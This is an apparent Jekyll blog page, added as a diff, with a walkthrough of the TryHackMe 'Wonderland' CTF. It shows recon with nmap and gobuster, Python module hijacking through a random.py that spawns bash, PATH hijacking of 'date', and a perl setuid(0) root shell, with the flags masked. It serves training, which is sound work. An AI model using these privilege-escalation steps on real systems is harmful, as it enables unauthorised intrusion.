@@ -1,0 +1,219 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Wonderland Writeup TryHackMe" /><meta name="author" content="v3r4x" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://0xv3r4x.github.io/posts/wonderland-writeup-tryhackme/" /><meta property="og:url" content="https://0xv3r4x.github.io/posts/wonderland-writeup-tryhackme/" /><meta property="og:site_name" content="v3r4x" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-30T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Wonderland Writeup TryHackMe" /><meta name="twitter:site" content="@0xv3r4x" /><meta name="twitter:creator" content="@v3r4x" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"v3r4x"},"dateModified":"2022-01-30T00:00:00+00:00","datePublished":"2022-01-30T00:00:00+00:00","description":"Overview","headline":"Wonderland Writeup TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xv3r4x.github.io/posts/wonderland-writeup-tryhackme/"},"url":"https://0xv3r4x.github.io/posts/wonderland-writeup-tryhackme/"}</script><title>Wonderland Writeup | TryHackMe | v3r4x</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="v3r4x"><meta name="application-name" content="v3r4x"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/avatar-small.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">v3r4x</a></div><div class="site-subtitle font-italic">semper vigilat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0xV3R4X" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xv3r4x" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Wonderland Writeup | TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Wonderland Writeup | TryHackMe</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1643500800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 30, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> v3r4x </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1181 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is my writeup for the Wonderland CTF. The Wonderland CTF is a free room of intermediate difficulty which tests your knowledge of privilege escalation. This challenge has no shortage of rabbit holes (pun intended) so it’s important to remain cautious and stick to your methodology.</p><h2 id="how-to-access"><span class="mr-2">How to Access</span><a href="#how-to-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I completed this CTF challenge on TryHackMe.</p><p>Link to the room:</p><ul><li>https://tryhackme.com/room/wonderland</ul><h2 id="steps"><span class="mr-2">Steps</span><a href="#steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When tackling a CTF like this, the standard practice is to start with reconnaissance. I typically start with an nmap scan:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>$ nmap -sC -sV -T4 -p- -oN nmap/initial_scan 10.10.7.151
+# Nmap 7.91 scan initiated Sun Mar 14 00:30:18 2021 as: nmap -sC -sV -T4 -p- -oN nmap/initial_scan 10.10.7.151
+Nmap scan report for 10.10.7.151
+Host is up (0.056s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Mar 14 00:30:54 2021 -- 1 IP address (1 host up) scanned in 35.96 seconds
+</pre></table></code></div></div><p>According to the scan, ports 22 (SSH) and 80 (HTTP) are open. I then navigated to the website to manually investigate whilst <code class="language-plaintext highlighter-rouge">gobuster</code> was running in the background:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>$ gobuster dir -e -u 10.10.7.151 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.7.151
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2021/03/14 00:33:52 Starting gobuster
+===============================================================
+http://10.10.7.151/img (Status: 301)
+http://10.10.7.151/index.html (Status: 301)
+http://10.10.7.151/r (Status: 301)
+===============================================================
+2021/03/14 00:34:12 Finished
+===============================================================
+</pre></table></code></div></div><p>Whilst manually crawling through the website, I discovered the <code class="language-plaintext highlighter-rouge">/img</code> directory and downloaded each image onto my machine. I then used <code class="language-plaintext highlighter-rouge">steghide</code> to see if there was anything embedded in the images:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ steghide extract -sf white_rabbit_1.jpg
+Enter passphrase:
+wrote extracted data to "hint.txt".
+$ cat hint.txt
+follow the r a b b i t
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">gobuster</code> output revealed a <code class="language-plaintext highlighter-rouge">/r</code> directory. Navigating to this shows:</p><p><img data-src="/assets/posts/20220130/r_directory.png" alt="r directory" data-proofer-ignore></p><p>From the <code class="language-plaintext highlighter-rouge">hint.txt</code>, I realised that there within this directory there is a <code class="language-plaintext highlighter-rouge">/a</code> directory. So, navigating to <code class="language-plaintext highlighter-rouge">/r/a/b/b/i/t</code> reveals:</p><p><img data-src="/assets/posts/20220130/r_a_b_b_i_t.png" alt="follow the r a b b i t" data-proofer-ignore></p><p>Inspecting the source code of this page revealed a hidden paragraph:</p><p><code class="language-plaintext highlighter-rouge">&lt;p style="display: none;"&gt;alice:H********************************************l&lt;/p&gt;</code></p><p>This looks like a username:password combination. So, I can now login via SSH:</p><p><img data-src="/assets/posts/20220130/alice_ssh_login.png" alt="ssh login with alice" data-proofer-ignore></p><p>The <code class="language-plaintext highlighter-rouge">alice</code> user’s home directory shows two files:</p><ul><li>root.txt: cannot be read.<li>walrus_and_the_carpenter.py: script that prints 10 random lines from a poem string.</ul><p>I decided to inspect what commands we can run as <code class="language-plaintext highlighter-rouge">alice</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>$ sudo --list
+[sudo] password for alice:
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</pre></table></code></div></div><p>Looks like we can run the Python file. Sample output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>$ python walrus_and_the_carpenter.py
+The line was:    "The night is fine," the Walrus said
+The line was:    Holding his pocket handkerchief
+The line was:    The sun was shining on the sea,
+The line was:    The Carpenter said nothing but
+The line was:    "The time has come," the Walrus said,
+The line was:    And made them trot so quick!"
+The line was:    Pepper and vinegar besides
+The line was:    Before his streaming eyes.
+The line was:    With sobs and tears he sorted out
+The line was:    And why the sea is boiling hot —
+</pre></table></code></div></div><p>This means we can hijack the module and spawn a bash shell by creating a <code class="language-plaintext highlighter-rouge">random.py</code> file in the same directory. Here is a link to the article which I used: <a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">click here</a>.</p><p>My <code class="language-plaintext highlighter-rouge">random.py</code> file simply imports <code class="language-plaintext highlighter-rouge">os</code> and <code class="language-plaintext highlighter-rouge">pty</code>, and then uses <code class="language-plaintext highlighter-rouge">.spawn()</code> to create a bash shell process. I can then execute this as the <code class="language-plaintext highlighter-rouge">rabbit</code> user, completing the privilege escalation.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>""" random.py - python module hijacking """
+import os
+import pty
+
+pty.spawn('/bin/bash')
+</pre></table></code></div></div><p>The result:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+rabbit@wonderland:~$
+</pre></table></code></div></div><p>Within the <code class="language-plaintext highlighter-rouge">rabbit</code> user’s <code class="language-plaintext highlighter-rouge">/home</code> directory there is a executable file named <code class="language-plaintext highlighter-rouge">teaParty</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Sun, 14 Mar 2021 02:03:38 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+Segmentation fault (core dumped)
+</pre></table></code></div></div><p>I downloaded this file onto my own machine using Python’s <code class="language-plaintext highlighter-rouge">http.server</code>. On the room machine, I ran:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>rabbit@wonderland:/home/rabbit$ python3.6 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.9.150.161 - - [14/Mar/2021 01:10:29] "GET /teaParty HTTP/1.1" 200 -
+</pre></table></code></div></div><p>And, on my machine, I ran:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ wget http://10.10.7.151:8000/teaParty
+--2021-03-14 01:10:29--  http://10.10.7.151:8000/teaParty
+Connecting to 10.10.7.151:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16816 (16K) [application/octet-stream]
+Saving to: ‘teaParty’
+
+teaParty           100%[===============&gt;]  16.42K  --.-KB/s    in 0.07s   
+
+2021-03-14 01:10:29 (237 KB/s) - ‘teaParty’ saved [16816/16816]
+</pre></table></code></div></div><p>After analysing the decompiled code, I found that “Segmentation fault (core dumped)” is printed as a string, and is not an error. I then noticed that the <code class="language-plaintext highlighter-rouge">date</code> module was being called, so I used the same module hijacking exploit that used earlier. I first created a file called <code class="language-plaintext highlighter-rouge">date</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>#!/bin/bash
+echo "Hijacking date module..."
+/bin/bash
+</pre></table></code></div></div><p>When run, this escalates privileges to become the <code class="language-plaintext highlighter-rouge">hatter</code> user. Navigating to their home directory reveals a <code class="language-plaintext highlighter-rouge">password.txt</code> file which contains their login credentials.</p><p><code class="language-plaintext highlighter-rouge">W*************************k</code></p><p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code>, it appears that this user has perl capabilities. This means I can do further privilege escalation by setting the UID of <code class="language-plaintext highlighter-rouge">hatter</code> to 0 (root):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX:;setuid(0); exec "/bin/sh";'
+# ls /home/alice
+__pycache__  random.py  root.txt  walrus_and_the_carpenter.py
+# cat /home/alice/root.txt
+thm{T********************************************************!}
+</pre></table></code></div></div><p>Going further into the <code class="language-plaintext highlighter-rouge">/root</code> directory:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre># ls -la /root
+total 28
+drwx--x--x  4 root root 4096 May 25  2020 .
+drwxr-xr-x 23 root root 4096 May 25  2020 ..
+lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4096 May 25  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 May 25  2020 .ssh
+-rw-r--r--  1 root root   32 May 25  2020 user.txt
+# cat /root/user.txt    
+thm{"C**********************!"}
+#
+</pre></table></code></div></div><p>And that’s it! All done!</p><h2 id="summary-and-feedback"><span class="mr-2">Summary and Feedback</span><a href="#summary-and-feedback" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This challenge really tested my knowledge of privilege escalation. If you are more of a beginner, I would strongly recommend trying one of the easier rooms as I didn’t know many of the tactics used in this guide (found due to extensive Googling).</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/wonderland/" class="post-tag no-text-decoration" >wonderland</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Wonderland+Writeup+%7C+TryHackMe+-+v3r4x&url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fwonderland-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Wonderland+Writeup+%7C+TryHackMe+-+v3r4x&u=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fwonderland-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fwonderland-writeup-tryhackme%2F&text=Wonderland+Writeup+%7C+TryHackMe+-+v3r4x" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/brooklyn-nine-nine-writeup-tryhackme/">Brooklyn Nine Nine Writeup | TryHackMe</a><li><a href="/posts/ejpt-cheatsheet/">eJPT Cheatsheet</a><li><a href="/posts/internal-writeup-tryhackme/">Internal Writeup | TryHackMe</a><li><a href="/posts/alfred-writeup-tryhackme/">Alfred Writeup | TryHackMe</a><li><a href="/posts/hackpark-writeup-tryhackme/">HackPark Writeup | TryHackMe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ignite-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642723200" data-df="ll" > Jan 21, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ignite Writeup | TryHackMe</h3><div class="text-muted small"><p> A new start-up has a few issues with their web server. Overview This is my writeup for the Ignite CTF. The Ignite CTF is a free room of beginner difficulty which mainly tests your methodology. ...</p></div></div></a></div><div class="card"> <a href="/posts/pickle-rick-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642982400" data-df="ll" > Jan 24, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pickle Rick Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Pickle Rick CTF. This is a free room of easy difficulty which tests your knowledge of enumeration and linux commands. How to Access I completed this room on ...</p></div></div></a></div><div class="card"> <a href="/posts/rootme-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1643155200" data-df="ll" > Jan 26, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RootMe Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the RootMe CTF. This is a free room of easy difficulty which tests your knowledge of privilege escalation. How to Access I completed this room on TryHackMe. The...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/the-great-escape-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Older"><p>The Great Escape Writeup | TryHackMe</p></a> <a href="/posts/how-to-turn-your-raspberry-pi-into-a-nas/" class="btn btn-outline-primary" prompt="Newer"><p>How to Turn your Raspberry Pi into a NAS</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xv3r4x">v3r4x</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a 